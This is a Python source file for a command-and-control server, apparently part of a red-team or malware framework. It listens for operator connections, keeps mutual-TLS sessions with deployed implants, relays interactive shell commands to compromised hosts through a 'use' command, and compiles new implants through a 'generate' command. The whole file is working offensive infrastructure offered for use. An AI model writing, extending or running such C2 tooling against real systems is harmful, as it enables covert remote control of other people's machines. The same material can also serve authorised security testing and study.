#!/usr/bin/env python3
# TODO: Convert CLI to CMD2
import logging
import sys


from mtls import mtls
from generate.generate import generate
from queue import Queue
from handler.handler import Handler

import socket
import threading
import uuid

class C2Server(object):
    connections = []

    def __init__(self):
        self.shutdown = 0

        ## Generating stuff for implant comms ##
        print("Listening for operators...")
        self.requestq = Queue() #this is a shared que between the handler and the listner, which fills with implant registration
        self.implantlistener = mtls.Listener(self.requestq) #begins implant listener w/ mtls encryption
        self.handler = Handler(self.requestq)
        self.handler.start()


        ## Generating stuff for operator comms ##
        print("Listening for implants...")
        self.clients = dict()

        self.host = ''
        self.port = 12345
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.host, self.port))
        threading.Thread(target=self.listen).start() #this is so we can listen and have execute commands from server console

    def serverMain(self):
        while self.shutdown == 0:
            pass

    def shell_session(self, session_id, client):
            conn, addr = self.implantlistener.sessions.get(session_id) 
            client.send((f"Using session with {addr}\n").encode("ascii"))

            while True:
                userin = client.recv(1024)

                if userin == b"exit":
                   client.send((f"Exiting session {addr}\n").encode("ascii"))
                   break 

                output = mtls.session(conn, userin)

                if not output:
                    break

                client.send(output) 

    def executecommand(self, command, client):
        #command is an array of strings
        if len(command) < 1:
            client.send(b"Plase enter a command")
            return

        elif command[0] == "sessions":
            return str(self.implantlistener.sessions.list()).encode('ascii')

        # Interact with a session
        elif command[0] == "use":
            if command[1] not in self.implantlistener.sessions.list():
                return (b"Session doesn't exist")

            if len(command) == 2:
                self.shell_session(command[1], client) 
            else:
                return(b"Usage: use <session>")

        # Compile an implant
        elif command[0] == "generate":
            print("Generating the implant...")
            generate(self.implantlistener.client_certs)

        else:
            return(b"Unknown Command")

    def listen(self):
        numberOfUsers = 5
        self.sock.listen(numberOfUsers)
        while True: #keep listening, start a new thread when a client connects
            client, address = self.sock.accept()

            id = str(uuid.uuid4())
            self.clients[id] = (client, address)


            print("[+]Connected to a new client at " + address[0] + ":" + str(address[1]) )
            t = threading.Thread(target = self.listenToClient,args = (client,address)).start()
            self.connections.append(address) 

    def listenToClient(self, client, address):
        size = 1024
        while True:
            data = client.recv(size)
            if data and (str(data.decode('ascii')).lower() != 'exit'):
                recvData = str(data.decode('ascii')).lower()

                response = self.executecommand(recvData.split(), client)

                logging.basicConfig(filename="Command Log.txt", level=logging.INFO)
                commandStr = ' '.join(recvData)
                logging.info("Command: " + commandStr)

                if response:
                    client.send(response)

            else:
                print("[+]Disconnected client " + address[0] +":"+ str(address[1]))
                client.close()
                break


def main():
    C2Server().serverMain()


if __name__ == "__main__":
    main()
